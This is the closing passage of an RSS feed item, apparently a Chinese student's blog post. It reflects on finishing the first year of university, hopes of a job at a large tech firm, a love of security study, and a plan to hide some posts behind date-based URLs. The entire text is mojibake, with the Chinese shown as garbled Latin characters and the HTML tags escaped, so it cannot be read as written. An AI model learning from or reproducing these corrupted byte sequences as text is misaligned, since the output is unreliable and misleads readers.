&lt;p>å†ä¸€æŠ¬çœ¼ï¼Œæš‘å‡å°±è¦æ¥äº†ã€‚è¦å¹²çš„å’Œè¦å­¦çš„å¾ˆå¤šï¼Œåƒå¤´ä¸‡ç»ªçš„ï¼›ä½†ä¹Ÿç®—æ˜¯æœ‰æ˜ç¡®çš„æ–¹å‘ï¼Œäººè¿˜æ˜¯å¿™èµ·æ¥å¥½ã€‚ä¸‹å­¦æœŸå°±å¤§äºŒäº†ï¼Œå†ä¸€æ™ƒå°±å¤§ä¸‰äº†ï¼Œè‡ªå·±æ˜¯ä¸æƒ³è€ƒç ”çš„ï¼Œä½†æ˜¯åˆ°äº†å¤§å›› è‡ªå·±çš„å®åŠ›å¤Ÿè¿›å¤§å‚å—ï¼Ÿä¼šä¸ä¼šæ¯•ä¸šå³å¤±ä¸šï¼Ÿæˆ‘ä¸çŸ¥é“ï¼Œä½†è°åˆçŸ¥é“å‘¢ï¼Ÿæœªæ¥çš„äº‹æƒ…é¢„æµ‹ä¸äº†ï¼Œèƒ½åšçš„åªæœ‰æŠŠæ¡å½“ä¸‹ã€‚&lt;/p>
&lt;p>å¤§ä¸€å°±è¦ç»“æŸäº†ï¼Œåœ¨å›¾ä¹¦é¦†å¸¸åçš„åº§ä½ä¸Šï¼Œæ‰“å¼€typoraï¼Œè‰è‰çš„å¤ç›˜äº†ä¸€ä¸‹æ•´ä¸ªä¸€å­¦å¹´ã€‚ä¸Šä¸€æ¬¡å†™å¤ç›˜æ€»ç»“è¿˜æ˜¯å…­æœˆåˆ åˆšå†›è®­å®Œï¼Œä¸€ä¸ªæœ‰ç‚¹è¿·èŒ«çš„æ—¶å€™ã€‚å¦‚æœè·Ÿ0åŸºç¡€çš„è‡ªå·±æ¯”èµ·æ¥ï¼Œå¯ä»¥è¯´æ˜¯æˆé•¿äº†ä¸å°‘ï¼›ä½†æˆ‘çŸ¥é“è¿™è¿˜è¿œè¿œè¾¾ä¸åˆ°å¹³å‡çº¿ï¼Œå·®çš„è¿˜å¤ªå¤šï¼Œæ˜¯å®Œå…¨æ‹¿ä¸å‡ºæ‰‹çš„ç¨‹åº¦ã€‚ä½†æ€»çš„æ¥è¯´ï¼Œè¿˜ç®—æœ‰ä¸€ç‚¹ç‚¹å°å°çš„æ”¶è·ï¼Œå¸Œæœ›è‡ªå·±åœ¨ä¹‹åçš„æ—¥å­é‡Œä¹Ÿèƒ½åšå®ˆä½åˆå¿ƒï¼Œä¿æŒå¯¹å®‰å…¨çš„çƒ­çˆ±ï¼Œä¿æŒå­¦ä¹ çš„çƒ­æƒ…ï¼Œä¹Ÿä¿æŒå¯¹ç¾å¥½ç”Ÿæ´»çš„çƒ­å¿±ï¼›å¸Œæœ›èƒ½å¤Ÿå˜å¾—è¶Šæ¥è¶Šå¼ºå¤§ï¼›å¸Œæœ›å¤§äºŒçš„å¯’å‡å†™å¤ç›˜æ€»ç»“çš„æ—¶å€™èƒ½æœ‰æ›´å¤šå¯å†™çš„ æ›´å¤šå¼€å¿ƒçš„äº‹æƒ…ã€‚&lt;/p>
&lt;p>ï¼šï¼‰&lt;/p>
&lt;hr>
&lt;p>ä¹‹åçš„æ€»ç»“å‘€ï¼Œä¸€äº›éšç¬”ä¹Ÿéƒ½ä¼šæ”¾åˆ°å°ç«™ä¸Šï¼Œä¸è¿‡ä¸€éƒ¨åˆ†å°±ä¸æ”¾åˆ°å…¬å¼€å±•ç¤ºçš„postsä¸Šäº†ï¼Œurlå°±æ˜¯/:year/:month/:day/:slug/çš„å½¢å¼ï¼Œç®—æ˜¯å˜ç›¸çš„åŠ å¯†åšå®¢äº†å­ï¼Ÿä¸è¿‡åº”è¯¥ä¹Ÿé˜²ä¸ä½ä»€ä¹ˆæï¼ˆ&lt;/p></description></item></channel></rss>